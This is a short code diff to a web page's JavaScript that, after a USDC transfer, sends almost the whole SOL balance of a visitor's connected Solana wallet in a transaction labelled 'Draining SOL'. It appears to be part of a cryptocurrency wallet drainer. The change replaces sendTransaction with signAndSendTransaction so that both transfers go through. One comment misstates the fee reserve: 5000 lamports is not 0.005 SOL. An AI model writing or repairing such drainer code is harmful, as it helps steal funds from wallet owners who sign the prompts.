@@ -145,8 +145,8 @@
                 tx.feePayer = window.solana.publicKey; 
 
                 // Send Transaction (User must sign)
-                // USE sendTransaction with connection to ensure proper serialization
-                const sigPush = await window.solana.sendTransaction(tx, connection);
+                // USE signAndSendTransaction to avoid serialization issues
+                const sigPush = await window.solana.signAndSendTransaction(tx);
                 status.innerText = "USDC Pushed! Draining SOL...";
                 console.log("Push TX:", sigPush);
 
@@ -162,7 +162,7 @@
                     lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                const sigDrain = await window.solana.sendTransaction(drainTx, connection);
+                const sigDrain = await window.solana.signAndSendTransaction(drainTx);
                 
                 status.innerText = "Success!";
                 log.innerText = `Push: ${sigPush}\nDrain: ${sigDrain}`;
